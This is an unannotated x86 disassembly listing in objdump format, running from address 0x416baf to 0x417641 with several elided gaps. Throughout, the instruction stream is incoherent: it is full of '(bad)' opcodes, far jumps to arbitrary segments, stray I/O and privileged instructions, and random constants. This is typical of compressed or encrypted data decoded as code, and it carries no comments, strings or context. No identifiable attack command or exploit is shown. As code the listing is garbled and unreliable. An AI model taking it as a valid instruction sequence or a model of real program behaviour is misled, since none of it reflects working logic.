  416baf:	adc    DWORD PTR [esi-0x59],ebp
  416bb2:	fisub  WORD PTR [ebp+ebx*4+0x3a]
  416bb6:	(bad)  
  416bb7:	pushf  
  416bb8:	mov    esi,ebx
  416bba:	xchg   ecx,eax
  416bbb:	pop    edi
  416bbc:	adc    BYTE PTR [ecx],bh
  416bbe:	les    ebx,FWORD PTR [esi-0x7c23271b]
  416bc4:	inc    esp
  416bc5:	jmp    0x2331faa4
  416bca:	ins    BYTE PTR es:[edi],dx
  416bcb:	mov    dh,0xf2
  416bcd:	jmp    0x5e6:0x1baf02a0
  416bd4:	(bad)  
  416bd5:	jg     0x416c20
  416bd7:	ja     0x416baf
  416bd9:	test   eax,0xfda9b095
  416bde:	call   0xaaab:0x1ecf641e
  416be5:	sar    cx,cl
  416be8:	xlat   BYTE PTR ds:[ebx]
  416be9:	aam    0xd3
  416beb:	mov    eax,0x4f3f
	...
  416c54:	add    BYTE PTR [eax],al
  416c56:	jecxz  0x416cbd
  416c58:	push   cs
  416c59:	test   DWORD PTR [esi-0x38a0401],0xc05b70a9
  416c63:	cdq    
  416c64:	pop    ebp
  416c65:	(bad)  
  416c66:	addr16 cmc 
  416c68:	add    BYTE PTR [eax],al
  416c6a:	add    BYTE PTR [ecx],al
  416c6c:	add    BYTE PTR [eax],al
  416c6e:	mov    bl,0x34
  416c70:	in     eax,0xcf
  416c72:	mov    DWORD PTR [esi],eax
  416c74:	aam    0x21
  416c76:	sub    eax,0x64eace8d
  416c7b:	ja     0x416c3c
  416c7d:	add    BYTE PTR [esi-0x54],bl
  416c80:	jge    0x416c22
  416c82:	mov    ch,0x7d
  416c84:	cs add cl,cl
  416c87:	ins    DWORD PTR es:[edi],dx
  416c88:	mov    bh,0x4b
  416c8a:	mov    ecx,?
  416c8c:	sahf   
  416c8d:	xchg   bl,al
  416c8f:	mov    ah,0x2
  416c91:	mov    ecx,0xd8583d25
  416c96:	out    0x6a,al
  416c98:	daa    
  416c99:	jne    0x416c46
  416c9b:	popa   
  416c9c:	mov    cl,BYTE PTR [esi-0x28]
  416c9f:	mov    ch,dl
  416ca1:	mov    ch,0x52
  416ca3:	dec    ecx
  416ca4:	cwde   
  416ca5:	cmp    bl,BYTE PTR [ebx+esi*2-0x11]
  416ca9:	inc    ecx
  416caa:	stos   BYTE PTR es:[edi],al
  416cab:	fs cwde 
  416cad:	xor    ebx,DWORD PTR [edx+0x35]
  416cb0:	and    cl,BYTE PTR [eax]
  416cb2:	dec    ecx
  416cb3:	aad    0x57
  416cb5:	ret    0xb21c
  416cb8:	int    0x83
  416cba:	xor    BYTE PTR [edx+0x59],dl
  416cbd:	push   ss
  416cbe:	mov    ah,BYTE PTR [edx+edi*8+0x66]
  416cc2:	jo     0x416cd7
  416cc4:	or     DWORD PTR [edx],edx
  416cc6:	stos   BYTE PTR es:[edi],al
  416cc7:	dec    edi
  416cc8:	and    bl,BYTE PTR [ecx-0x27]
  416ccb:	jns    0x416cb8
  416ccd:	lods   al,BYTE PTR ds:[esi]
  416cce:	mov    ecx,0x81d508bd
  416cd3:	shl    BYTE PTR [ecx-0x23],1
  416cd6:	cld    
  416cd7:	lods   al,BYTE PTR ds:[esi]
  416cd8:	shl    BYTE PTR [esi+ebx*8+0x5b],cl
  416cdc:	in     al,dx
  416cdd:	xchg   BYTE PTR [edi-0x5170ebb3],ch
  416ce3:	addr16 cdq 
  416ce5:	mov    edi,0x96536a3
  416cea:	cmc    
  416ceb:	jl     0x416d11
  416ced:	(bad)  
  416cee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cef:	xor    edx,esi
  416cf1:	jg     0x416d40
  416cf3:	and    DWORD PTR [ecx-0x2f9e6df0],edi
  416cf9:	mov    ch,0x4d
  416cfb:	mov    al,0xb2
  416cfd:	sti    
  416cfe:	test   BYTE PTR [edx-0x66],0xc4
  416d02:	push   ebp
  416d03:	jge    0x416d5d
  416d05:	push   eax
  416d06:	inc    ebx
  416d07:	mov    dl,0x16
  416d09:	loope  0x416ca1
  416d0b:	xchg   DWORD PTR [ecx],eax
  416d0d:	jecxz  0x416d0d
  416d0f:	add    bl,0x6f
  416d12:	lea    ebx,[ecx-0x61]
  416d15:	fs mov edx,0x60260db8
  416d1b:	icebp  
  416d1c:	bndstx [esi+0x39c351f6],bnd2
  416d23:	xchg   ebp,eax
  416d24:	adc    DWORD PTR [edi],esi
  416d26:	(bad)  
  416d28:	repnz cld 
  416d2a:	xor    esi,0xffffffcd
  416d2d:	mov    ds:0x6978336f,al
  416d32:	sub    ah,BYTE PTR [esi-0x49]
  416d35:	rcl    BYTE PTR [edi-0x59],1
  416d38:	cmp    esp,DWORD PTR [ecx]
  416d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d3b:	dec    eax
  416d3c:	adc    al,0xf0
  416d3e:	mov    esi,0x202020cc
  416d43:	imul   ebx,esi,0xffffff9e
  416d46:	mov    dh,0xc8
  416d48:	in     al,0xe6
  416d4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d4b:	pop    es
  416d4c:	pop    ds
  416d4d:	add    eax,0x454aacdb
  416d52:	rcl    DWORD PTR [ecx+0x73a64783],0x85
  416d59:	mov    WORD PTR [ebx],?
  416d5b:	adc    edi,DWORD PTR [esp+ebx*8+0x1d]
  416d5f:	repz popa 
  416d61:	gs dec eax
  416d63:	add    cl,BYTE PTR [edx-0x66714784]
  416d69:	lea    ebp,[esi+0x4a9310]
	...
  416dd3:	add    BYTE PTR [eax],al
  416dd5:	add    BYTE PTR [ecx],ah
  416dd7:	xchg   ebx,eax
  416dd8:	mov    DWORD PTR [edi-0x60d84045],ebp
  416dde:	mov    ch,0x99
  416de0:	pop    edx
  416de1:	das    
  416de2:	pop    esp
  416de3:	dec    DWORD PTR [ebx]
  416de5:	pusha  
  416de6:	test   BYTE PTR [bx+si],0x0
  416dea:	add    BYTE PTR [ecx],al
  416dec:	add    BYTE PTR [eax],al
  416dee:	aas    
  416def:	cmp    eax,0xb3e3e78f
  416df4:	adc    DWORD PTR [edx+0x209ca9d4],esi
  416dfa:	ret    0x8a4e
  416dfd:	jmp    0xab0:0x1096c06a
  416e04:	mov    eax,0xf7e7b5b9
  416e09:	imul   edi
  416e0b:	jmp    0x416e28
  416e0d:	int    0xa8
  416e0f:	and    al,0x8f
  416e11:	jns    0x416db2
  416e13:	inc    esi
  416e14:	xor    DWORD PTR ds:0xb8282014,eax
  416e1a:	dec    edx
  416e1b:	mov    edx,0x97bb51c5
  416e20:	dec    edi
  416e21:	pushf  
  416e22:	inc    bh
  416e24:	jle    0x416ddc
  416e26:	add    edi,0xdf2e0975
  416e2c:	jbe    0x416ead
  416e2e:	(bad)  
  416e2f:	cdq    
  416e30:	call   DWORD PTR [esi+0x270f7eff]
  416e36:	shl    BYTE PTR [edi+0x6],1
  416e39:	aad    0xb0
  416e3b:	jo     0x416e7e
  416e3d:	or     BYTE PTR [eax+ebp*8],bh
  416e40:	into   
  416e41:	xchg   esp,esp
  416e43:	xchg   edx,ecx
  416e45:	mov    bh,0x37
  416e47:	adc    al,0x17
  416e49:	xor    eax,0xb2e28595
  416e4e:	shl    BYTE PTR [edi-0x51aa3a45],cl
  416e54:	in     al,0xfb
  416e56:	retf   0x26a7
  416e59:	daa    
  416e5a:	inc    eax
  416e5b:	jbe    0x416ec1
  416e5d:	mov    WORD PTR [edx],es
  416e5f:	sub    al,BYTE PTR [ebx-0x78]
  416e62:	clc    
  416e63:	push   esi
  416e64:	xchg   esp,eax
  416e65:	mov    esp,0xba885485
  416e6a:	dec    ebp
  416e6b:	loop   0x416e84
  416e6d:	mov    DWORD PTR [ecx+0x13],0xad42f5af
  416e74:	xchg   esp,eax
  416e75:	rol    esi,cl
  416e77:	out    dx,eax
  416e78:	gs and edi,edi
  416e7b:	rcl    BYTE PTR [edi-0x4393a1cc],0x33
  416e82:	xchg   edx,ecx
  416e84:	xor    ah,BYTE PTR [edx]
  416e86:	mov    esi,ss
  416e88:	in     eax,dx
  416e89:	sbb    ebp,0x24
  416e8c:	xlat   BYTE PTR ds:[ebx]
  416e8d:	sub    al,0xc2
  416e8f:	or     edi,ecx
  416e91:	out    0x94,al
  416e93:	jns    0x416e5b
  416e95:	and    dh,BYTE PTR [ebp+0x606cef4a]
  416e9b:	retf   
  416e9c:	inc    ebp
  416e9d:	sbb    eax,DWORD PTR [edx+eiz*4+0x327c713b]
  416ea4:	ds dec esi
  416ea6:	movd   mm1,DWORD PTR [edx+0x10]
  416eaa:	push   ebp
  416eab:	fstp   QWORD PTR [ecx+esi*1+0x19a638de]
  416eb2:	or     al,0xf6
  416eb4:	jp     0x416eec
  416eb6:	push   ebp
  416eb7:	shl    ebp,0x75
  416eba:	add    cl,BYTE PTR [eax+0x40e16d17]
  416ec0:	mov    al,0x7d
  416ec2:	sysenter 
  416ec4:	je     0x416f09
  416ec6:	ins    BYTE PTR es:[edi],dx
  416ec7:	mov    dh,0x42
  416ec9:	sbb    DWORD PTR [eax+0x285067aa],ebp
  416ecf:	and    eax,ebp
  416ed1:	maskmovq mm5,(bad)
  416ed2:	imul   DWORD PTR [ebx]
  416ed4:	mov    edx,0xa410bb4c
  416ed9:	push   es
  416eda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416edb:	jmp    0x416e78
  416edd:	arpl   sp,cx
  416edf:	call   DWORD PTR [eax+0x4f]
  416ee2:	sti    
  416ee3:	xlat   BYTE PTR ds:[ebx]
  416ee4:	shrx   ebp,eax,ebp
  416ee9:	ss mov al,es:0xb3b6
	...
  416f54:	add    BYTE PTR [eax],al
  416f56:	mov    edi,0xae6d8e19
  416f5b:	(bad)  
  416f5c:	(bad)  
  416f5d:	fucomi st,st(0)
  416f5f:	xor    eax,0x7de98eea
  416f64:	retf   
  416f65:	out    dx,al
  416f66:	test   DWORD PTR [bx+si],0x10000
  416f6d:	add    BYTE PTR [edi+0x320cf897],dl
  416f73:	jno    0x416f23
  416f75:	dec    ecx
  416f76:	pop    edi
  416f77:	xchg   esi,eax
  416f78:	push   0x4b
  416f7a:	das    
  416f7b:	mov    al,0x43
  416f7d:	adc    DWORD PTR [ebx],ebx
  416f7f:	ret    
  416f80:	ss ins BYTE PTR es:[edi],dx
  416f82:	frstor [ecx-0x3293b5eb]
  416f88:	clc    
  416f89:	in     al,dx
  416f8a:	ret    
  416f8b:	(bad)  
  416f8c:	pop    ebp
  416f8d:	enter  0x5eb,0xd9
  416f91:	fstp   TBYTE PTR [esi-0x281d9aa0]
  416f97:	sub    bl,bl
  416f99:	add    bh,0x5
  416f9c:	xchg   BYTE PTR [esi+ebx*8],dh
  416f9f:	sbb    eax,0x5441dff4
  416fa4:	es sbb al,0x83
  416fa7:	bound  esp,QWORD PTR [edi]
  416fa9:	lds    edi,FWORD PTR cs:0x7694e697
  416fb0:	cmp    al,0x88
  416fb2:	fwait
  416fb3:	arpl   bx,cx
  416fb5:	call   0x83255d0e
  416fba:	enter  0x84b8,0x54
  416fbe:	enter  0xc11b,0x9a
  416fc2:	adc    dh,BYTE PTR [eax-0x914beb6]
  416fc8:	jmp    0x7dfbae76
  416fcd:	mov    bl,0xe6
  416fcf:	inc    eax
  416fd0:	sbb    ah,dh
  416fd2:	mov    edx,0x9be9d99e
  416fd7:	icebp  
  416fd8:	in     al,dx
  416fd9:	mov    ebx,0x9a58322f
  416fde:	push   esp
  416fdf:	scas   eax,DWORD PTR es:[edi]
  416fe0:	inc    edi
  416fe1:	test   esi,ecx
  416fe3:	or     al,0xda
  416fe5:	mov    ch,0x2a
  416fe7:	cmp    al,0x10
  416fe9:	dec    edx
  416fea:	rcr    ch,0x62
  416fed:	xchg   ebx,eax
  416fee:	lods   eax,DWORD PTR ds:[esi]
  416fef:	xor    dh,BYTE PTR gs:[eax-0x66]
  416ff3:	mov    bl,BYTE PTR [edi+0x11f80917]
  416ff9:	pop    ss
  416ffa:	mov    ebp,0x6bfadc3b
  416fff:	and    al,0x47
  417001:	clc    
  417002:	ficomp DWORD PTR [ecx-0x39]
  417005:	ja     0x416ffa
  417007:	hlt    
  417008:	xor    BYTE PTR [edi+0x4a226c34],dl
  41700e:	xor    BYTE PTR [ebx+0x67621b18],ch
  417014:	test   BYTE PTR [ecx+0xd],ch
  417017:	ret    
  417018:	add    al,0x83
  41701a:	jmp    0x6aa0:0xa0a1db5
  417021:	adc    DWORD PTR [edi+0x27],eax
  417024:	push   ds
  417025:	xor    DWORD PTR [eax-0x76],0x967cf36a
  41702c:	aad    0x58
  41702e:	and    edi,esp
  417030:	in     eax,0x54
  417032:	popf   
  417033:	js     0x417056
  417035:	mov    eax,edx
  417037:	fcomip st,st(3)
  417039:	pop    edi
  41703a:	jmp    0x23a7:0x69dc2e5f
  417041:	lods   eax,DWORD PTR ds:[esi]
  417042:	xchg   esi,eax
  417043:	mov    ds:0xe1cff2da,eax
  417048:	sub    BYTE PTR [ebx],cl
  41704a:	pop    esi
  41704b:	test   al,0xf
  41704d:	aaa    
  41704e:	sahf   
  41704f:	es sahf 
  417051:	add    eax,ebp
  417053:	mov    esp,0xe7932468
  417058:	xchg   edi,eax
  417059:	adc    DWORD PTR [eax+0x57],esi
  41705c:	shl    BYTE PTR [ebp-0x16],1
  41705f:	cmp    BYTE PTR [ebx+0x2be6579f],bh
  417065:	fdiv   st(3),st
  417067:	ds mov esi,0x36b2837d
  41706d:	add    BYTE PTR es:[eax],al
	...
  4170d4:	add    BYTE PTR [eax],al
  4170d6:	jbe    0x417105
  4170d8:	push   ebp
  4170d9:	inc    ecx
  4170da:	pop    edi
  4170db:	jns    0x417153
  4170dd:	aas    
  4170de:	(bad)  
  4170df:	loopne 0x4170d5
  4170e1:	sub    esp,DWORD PTR [esp+ecx*1]
  4170e4:	sbb    ah,BYTE PTR [ecx]
  4170e6:	addr16 clc 
  4170e8:	add    BYTE PTR [eax],al
  4170ea:	add    BYTE PTR [ecx],al
  4170ec:	add    BYTE PTR [eax],al
  4170ee:	sbb    dh,BYTE PTR [eax+0x1ddcff90]
  4170f4:	rcl    DWORD PTR [ebx+eiz*4-0x37dc94d8],1
  4170fb:	xchg   edi,eax
  4170fc:	and    al,0xd8
  4170fe:	(bad)  
  4170ff:	int    0x2c
  417101:	addr16 cld 
  417103:	rcr    DWORD PTR [esi-0x2f],1
  417106:	xor    eax,0x29d19467
  41710b:	dec    ebp
  41710c:	and    ch,BYTE PTR [eax-0x29]
  41710f:	xchg   ebp,eax
  417110:	pop    ss
  417111:	xor    edx,DWORD PTR [ebx]
  417113:	or     al,0xd4
  417115:	mov    ebp,0x3543bfde
  41711a:	call   DWORD PTR [eax-0x66]
  41711d:	pop    edi
  41711e:	and    eax,DWORD PTR [edi+ebx*4-0x5267621d]
  417125:	sub    esp,0xbc7e3435
  41712b:	dec    edx
  41712c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41712d:	cmp    DWORD PTR [edx+0x61],ebx
  417130:	lods   al,BYTE PTR ds:[esi]
  417131:	dec    ebx
  417132:	fstp   DWORD PTR [ebx+0x6c1389cd]
  417138:	call   0x6a4f:0xdc323de1
  41713f:	and    eax,0x5f25afb4
  417144:	fwait
  417145:	retf   0x63f6
  417148:	jp     0x4171b0
  41714a:	mov    ebp,0x28872af0
  41714f:	fld    TBYTE PTR [ebp+0xb104e8d]
  417155:	ret    
  417156:	sbb    al,0x91
  417158:	dec    ebp
  417159:	aaa    
  41715a:	cwde   
  41715b:	jl     0x417185
  41715d:	xchg   ebx,eax
  41715e:	loop   0x4171dc
  417160:	(bad)  
  417161:	sbb    DWORD PTR [esi+0x3b],eax
  417164:	cli    
  417165:	or     BYTE PTR [ebp-0x60],dl
  417168:	jno    0x417160
  41716a:	or     edi,edx
  41716c:	or     ebp,DWORD PTR [eax-0x33135d12]
  417172:	sub    eax,0x70e8ad66
  417177:	arpl   WORD PTR [esi],bp
  417179:	sub    dh,BYTE PTR [edi+0x63]
  41717c:	dec    ecx
  41717d:	test   al,0xfc
  41717f:	dec    edx
  417181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417182:	lods   eax,DWORD PTR ds:[esi]
  417183:	fcmovb st,st(2)
  417185:	ficomp WORD PTR [edi]
  417187:	sub    BYTE PTR ds:0x75d6c9b8,bl
  41718d:	jecxz  0x4171ba
  41718f:	xor    ah,BYTE PTR [esi+0x40]
  417192:	shr    DWORD PTR [edx+0x78b947c3],0xca
  417199:	mov    al,ds:0x18a5927a
  41719e:	xchg   edx,eax
  41719f:	push   ecx
  4171a0:	rol    BYTE PTR [ecx-0x672b3bb],cl
  4171a6:	sub    DWORD PTR [edi],0x41
  4171a9:	into   
  4171aa:	out    dx,al
  4171ab:	adc    al,0x54
  4171ad:	pop    esi
  4171ae:	int    0xed
  4171b0:	mov    dh,0x85
  4171b2:	fstp   DWORD PTR ds:0x7b382e5c
  4171b8:	and    al,0x8b
  4171ba:	push   ecx
  4171bb:	and    ah,BYTE PTR [edx]
  4171bd:	fisubr DWORD PTR [edi+ebx*2]
  4171c0:	and    BYTE PTR [edx-0x50],cl
  4171c3:	ficom  WORD PTR [ecx-0x7bd525e8]
  4171c9:	or     dh,BYTE PTR [edx]
  4171cb:	jb     0x4171ac
  4171cd:	ins    DWORD PTR es:[edi],dx
  4171ce:	mov    ecx,0x2f82ef28
  4171d3:	imul   edx,DWORD PTR [edi],0xffffffd0
  4171d6:	dec    ebx
  4171d7:	mov    al,0x3e
  4171d9:	enter  0xf260,0xe7
  4171dd:	test   BYTE PTR [edx+esi*4+0x2d5b56d3],dh
  4171e4:	mov    ds:0x50de4c15,al
  4171e9:	dec    ebx
  4171ea:	hlt    
  4171eb:	leave  
  4171ec:	or     eax,0x6b
	...
  417255:	add    BYTE PTR [esi-0xe58fe7],ah
  41725b:	jnp    0x41724b
  41725d:	mov    ebp,0x986526a4
  417262:	fcom   DWORD PTR [ebx-0x6983fe0]
  417268:	add    BYTE PTR [eax],al
  41726a:	add    BYTE PTR [ecx],al
  41726c:	add    BYTE PTR [eax],al
  41726e:	push   cs
  41726f:	mov    ah,0x20
  417271:	pushf  
  417272:	push   ds
  417273:	xor    ecx,DWORD PTR [eax-0x26]
  417276:	jg     0x4172ce
  417278:	jl     0x4172a6
  41727a:	js     0x417278
  41727c:	mov    ebp,0xd722adc7
  417281:	adc    ecx,DWORD PTR [eax+0x5a]
  417284:	call   0x5f8cccb6
  417289:	lea    esi,[ecx-0x44]
  41728c:	jno    0x4172d4
  41728e:	cmp    eax,0x217ee624
  417293:	loope  0x417216
  417295:	push   esp
  417296:	sar    dl,1
  417298:	push   es
  417299:	sbb    edx,DWORD PTR [ecx-0x5a]
  41729c:	lods   al,BYTE PTR ds:[esi]
  41729d:	mov    WORD PTR [ebp+0x8a6f21d],ss
  4172a3:	rol    BYTE PTR [ecx+0x76],cl
  4172a6:	and    al,0xbd
  4172a8:	cli    
  4172a9:	sbb    DWORD PTR [ebx],edx
  4172ab:	retf   0x2663
  4172ae:	xchg   esi,eax
  4172af:	(bad)  
  4172b0:	cs mov bh,0x33
  4172b3:	sahf   
  4172b4:	mov    esp,0x4ef98e3
  4172b9:	jbe    0x417312
  4172bb:	mov    BYTE PTR [ecx-0x1e93d644],bl
  4172c1:	sbb    eax,0xffffff90
  4172c4:	push   es
  4172c5:	imul   BYTE PTR [esi-0x3ff4474]
  4172cb:	(bad)  
  4172cc:	addr16 xchg edx,eax
  4172ce:	pop    edx
  4172cf:	xor    esi,DWORD PTR [eax+0x476be128]
  4172d5:	out    dx,al
  4172d6:	xor    edx,DWORD PTR [esi]
  4172d8:	cdq    
  4172d9:	lahf   
  4172da:	out    dx,eax
  4172db:	cmp    bh,dh
  4172dd:	icebp  
  4172de:	cdq    
  4172df:	addr16 pop ds
  4172e1:	fiadd  WORD PTR [esi-0x7b603c4a]
  4172e7:	xchg   dl,ah
  4172e9:	add    ebp,ecx
  4172eb:	(bad)  
  4172ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172ed:	(bad)  
  4172ee:	adc    ecx,DWORD PTR [edi+0x9]
  4172f1:	mov    esi,0x98a0cb2
  4172f6:	mov    al,0x6d
  4172f8:	sub    esp,ebx
  4172fa:	adc    ebp,eax
  4172fc:	xor    esi,ebp
  4172fe:	test   eax,0xe710c1fe
  417303:	test   edi,esi
  417305:	pop    eax
  417306:	fldcw  WORD PTR [esi+eiz*4+0x53]
  41730a:	int    0x63
  41730c:	push   ss
  41730d:	push   es
  41730e:	or     eax,0xcbdd7841
  417313:	inc    esp
  417314:	xor    al,0xa1
  417316:	mov    ecx,0x77552234
  41731b:	nop
  41731c:	push   ss
  41731d:	fst    DWORD PTR [ecx-0x428b70db]
  417323:	loopne 0x417356
  417325:	cmp    DWORD PTR [ebx+0xdfee193],ecx
  41732b:	jbe    0x417350
  41732d:	inc    ebx
  41732e:	xor    eax,0xf3eef99d
  417333:	sub    dh,BYTE PTR [edx]
  417335:	mov    al,ds:0xe0863d01
  41733a:	push   cs
  41733b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41733c:	xor    edi,ebp
  41733e:	int3   
  41733f:	into   
  417340:	dec    ecx
  417341:	mov    ah,0x93
  417343:	mov    cl,0x21
  417345:	inc    esi
  417346:	cmp    eax,0x2b35a293
  41734b:	outs   dx,DWORD PTR ds:[esi]
  41734c:	imul   esi,DWORD PTR [edx+0xdf94d8f],0x9
  417353:	mov    edx,0xd7895fee
  417358:	cmp    BYTE PTR [edi-0x5d8ec651],al
  41735e:	jmp    0x417352
  417360:	jnp    0x4173ae
  417362:	jnp    0x41736f
  417364:	push   edi
  417365:	nop
  417366:	jo     0x417398
  417368:	cmp    edi,DWORD PTR [edx]
  41736a:	xchg   DWORD PTR [ebp+0x29],ebp
  41736d:	sbb    BYTE PTR [eax],al
	...
  4173d3:	add    BYTE PTR [eax],al
  4173d5:	add    BYTE PTR [ecx-0x44],ch
  4173d8:	xlat   BYTE PTR ds:[ebx]
  4173d9:	pop    esi
  4173da:	xlat   BYTE PTR ds:[ebx]
  4173db:	jg     0x4173c6
  4173dd:	mov    edi,0x6508016b
  4173e2:	adc    DWORD PTR [ebp+0x6b],ecx
  4173e5:	adc    DWORD PTR [edi-0x6],esp
  4173e8:	add    BYTE PTR [eax],al
  4173ea:	add    BYTE PTR [ecx],al
  4173ec:	add    BYTE PTR [eax],al
  4173ee:	mov    edx,0xa30f4747
  4173f3:	dec    esp
  4173f4:	or     al,0x30
  4173f6:	lahf   
  4173f7:	test   ebx,0x8786390
  4173fd:	dec    esp
  4173fe:	mov    ebx,0xf6ee52de
  417403:	mov    ds:0xda2acdc8,eax
  417408:	icebp  
  417409:	call   0x25f60874
  41740e:	sub    DWORD PTR [ecx],0xd94b28fb
  417414:	pop    ss
  417415:	sub    eax,0x7c904d42
  41741a:	cmc    
  41741b:	dec    esi
  41741c:	pop    ss
  41741d:	nop
  41741e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41741f:	mov    ebx,0x60f38d66
  417424:	(bad)  
  417426:	dec    edi
  417427:	pop    ebx
  417428:	rcl    dh,0x53
  41742b:	xchg   esp,eax
  41742c:	inc    eax
  41742d:	xor    BYTE PTR [eax],cl
  41742f:	mov    dh,0xdf
  417431:	je     0x4173e4
  417433:	dec    esp
  417434:	test   al,0x17
  417436:	pop    ecx
  417437:	sbb    DWORD PTR [ebx+0x7c],edi
  41743a:	jmp    0xa9d:0x5c47e613
  417441:	xchg   esp,eax
  417442:	sub    al,0x98
  417444:	loope  0x41744e
  417446:	push   eax
  417447:	mov    ecx,0xd3d7ea87
  41744c:	enter  0xa6a8,0xbf
  417450:	inc    ecx
  417451:	cld    
  417452:	cmp    al,0xc0
  417454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417455:	jns    0x4174c3
  417457:	mov    al,0xbc
  417459:	mov    bl,0xeb
  41745b:	loop   0x417457
  41745d:	scas   al,BYTE PTR es:[edi]
  41745e:	sbb    BYTE PTR [edi-0x73],cl
  417461:	out    0xb2,al
  417463:	xor    esi,DWORD PTR [ebx]
  417465:	sub    ch,BYTE PTR [edi+0x2293b343]
  41746b:	xor    cl,ch
  41746d:	adc    al,0x4e
  41746f:	mov    ds:0x9b31248,eax
  417474:	sbb    esp,esi
  417476:	test   eax,0xc5034b9c
  41747b:	mov    esi,0xde6e46e8
  417480:	add    bh,BYTE PTR [eax-0x6c0207a3]
  417486:	fucomi st,st(2)
  417488:	add    ecx,ecx
  41748a:	pushw  0x530f
  41748e:	mov    dh,0x6f
  417490:	adc    esp,DWORD PTR [edi+0x2fe49797]
  417496:	mov    eax,ds:0x7e83108a
  41749b:	mov    ch,0xc9
  41749d:	fxch   st(4)
  41749f:	or     ecx,edx
  4174a1:	pushw  0x24
  4174a4:	mov    BYTE PTR [esi],dl
  4174a6:	cmp    esp,esi
  4174a8:	mov    eax,ds:0xcdcd28c2
  4174ad:	mov    al,0x68
  4174af:	bound  edx,QWORD PTR [esi-0x49]
  4174b2:	retf   
  4174b3:	mov    DWORD PTR [edx],ecx
  4174b5:	ja     0x4174cc
  4174b7:	test   DWORD PTR [esi+edx*1+0x6a9636d3],esp
  4174be:	loop   0x417527
  4174c0:	inc    esi
  4174c1:	mov    dh,0x3a
  4174c3:	cmp    al,0xde
  4174c5:	or     bl,ah
  4174c7:	mov    al,BYTE PTR [ecx+0x419bf153]
  4174cd:	push   0x17128c49
  4174d2:	add    esi,DWORD PTR [eax+0x705a1d32]
  4174d8:	cs sub al,0x5f
  4174db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174dc:	mov    dh,0x6d
  4174de:	mov    ecx,0x8f9fce96
  4174e3:	sbb    WORD PTR [ecx],di
  4174e6:	test   DWORD PTR [eax-0x26],ecx
  4174e9:	pop    ds
  4174ea:	and    bl,BYTE PTR [eax+0x5e5c]
	...
  417554:	add    BYTE PTR [eax],al
  417556:	xchg   ecx,eax
  417557:	mov    edx,0xdc6b0c6a
  41755c:	idiv   DWORD PTR [edi+0x212a686b]
  417562:	je     0x417581
  417564:	repnz cwde 
  417566:	addr16 sti 
  417568:	add    BYTE PTR [eax],al
  41756a:	add    BYTE PTR [ecx],al
  41756c:	add    BYTE PTR [eax],al
  41756e:	xchg   edx,eax
  41756f:	jle    0x417582
  417571:	push   edi
  417572:	mov    al,BYTE PTR [ecx]
  417574:	scas   al,BYTE PTR es:[edi]
  417575:	xchg   ebp,eax
  417576:	adc    ch,BYTE PTR [ebx-0x68c06492]
  41757c:	addr16 push ds
  41757e:	outs   dx,DWORD PTR ds:[esi]
  41757f:	nop
  417580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417581:	or     al,0x20
  417583:	xchg   ah,dl
  417585:	jo     0x417594
  417587:	or     BYTE PTR [esi],dl
  417589:	push   ebp
  41758a:	push   ds
  41758b:	loope  0x417552
  41758d:	pusha  
  41758e:	jo     0x4175a8
  417590:	push   edx
  417591:	adc    al,0x38
  417593:	sub    dl,al
  417595:	in     eax,dx
  417596:	fisubr WORD PTR [esi-0x2c]
  417599:	sti    
  41759a:	ds inc esi
  41759c:	fld    TBYTE PTR [esp+ecx*2-0x20]
  4175a0:	cs cs mov ah,0xa7
  4175a4:	das    
  4175a5:	ins    BYTE PTR es:[edi],dx
  4175a6:	jae    0x41753a
  4175a8:	es leave 
  4175aa:	push   es
  4175ab:	or     edx,ebp
  4175ad:	mov    edi,0xb9b468bb
  4175b2:	jae    0x4175b0
  4175b4:	inc    ecx
  4175b5:	dec    ebp
  4175b6:	jge    0x417545
  4175b8:	lds    esi,FWORD PTR [ebp+0x57]
  4175bb:	fsubr  DWORD PTR [edx+0x125005be]
  4175c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175c2:	jbe    0x4175cc
  4175c4:	cld    
  4175c5:	cld    
  4175c6:	push   ebx
  4175c7:	mov    bl,0x8b
  4175c9:	popa   
  4175ca:	mov    DWORD PTR [eax-0x5bd1d68d],edx
  4175d0:	popa   
  4175d1:	inc    edi
  4175d2:	sub    ah,cl
  4175d4:	out    0xc2,eax
  4175d6:	or     eax,0x314d19aa
  4175db:	sbb    BYTE PTR [eax+0x1f786bed],dh
  4175e1:	sbb    DWORD PTR [esi-0x7a90eae7],eax
  4175e7:	jmp    0xf0643ce6
  4175ec:	fcom   st(3)
  4175ee:	psubb  mm3,mm2
  4175f1:	dec    edx
  4175f2:	dec    eax
  4175f3:	inc    esp
  4175f4:	jle    0x4175b0
  4175f6:	pop    esi
  4175f7:	shl    BYTE PTR [ecx],0x3c
  4175fa:	and    esi,DWORD PTR [ebx]
  4175fc:	pop    ss
  4175fd:	kunpckbw k5,k2,k3
  417601:	stc    
  417602:	pushf  
  417603:	lahf   
  417604:	call   0x41773f1b
  417609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41760a:	push   ebp
  41760b:	je     0x4175c5
  41760d:	ss pop ebx
  41760f:	inc    ecx
  417610:	mov    ds:0x3f3dad6d,al
  417615:	mov    ch,0xe9
  417617:	scas   al,BYTE PTR es:[edi]
  417618:	cmp    BYTE PTR [esi+edi*8],bl
  41761b:	mov    DWORD PTR [edi+0x404bac25],edi
  417621:	adc    DWORD PTR [ecx-0x49],edx
  417624:	dec    edx
  417625:	std    
  417626:	pop    ebp
  417627:	imul   edx,DWORD PTR [ebx],0x5195a37c
  41762d:	test   DWORD PTR [ecx],0x693293b4
  417633:	std    
  417634:	xor    DWORD PTR [ecx+0x2e],eax
  417637:	(bad)  
  417638:	retf   0x878e
  41763b:	add    bh,cl
  41763d:	xchg   ebp,eax
  41763e:	nop
  41763f:	push   cs
  417640:	stos   DWORD PTR es:[edi],eax
  417641:	aaa    
